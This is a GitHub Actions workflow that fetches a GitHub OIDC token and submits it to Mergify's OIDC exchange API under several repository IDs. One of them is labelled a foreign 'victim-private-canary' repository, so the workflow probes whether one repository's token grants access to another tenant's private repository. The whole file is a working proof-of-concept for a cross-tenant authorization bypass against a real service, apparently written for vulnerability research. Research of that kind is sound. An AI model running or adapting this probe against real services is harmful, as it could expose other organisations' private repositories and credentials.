name: oidc-e2e
on:
  push:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  exchange:
    runs-on: ubuntu-latest
    steps:
      - name: exchange probes
        run: |
          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api.mergify.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          probe () {
            echo "=== $1"
            python3 - "$2" "$TOKEN" <<'PY' > /tmp/body
import json,sys
print(json.dumps({"repository_id":int(sys.argv[1]),"id_token":sys.argv[2]}))
PY
            curl -s -o /tmp/r -w 'status=%{http_code}\n' -X POST https://api.mergify.com/v1/ci/oidc/exchange -H 'Content-Type: application/json' --data @/tmp/body
            head -c 500 /tmp/r; echo
          }
          probe "A own repo 535704198" 535704198
          probe "B own other repo 557596580 (commerce)" 557596580
          probe "C FOREIGN repo 1458145787 (diablo31/victim-private-canary)" 1458145787
          probe "D bogus 999999999" 999999999
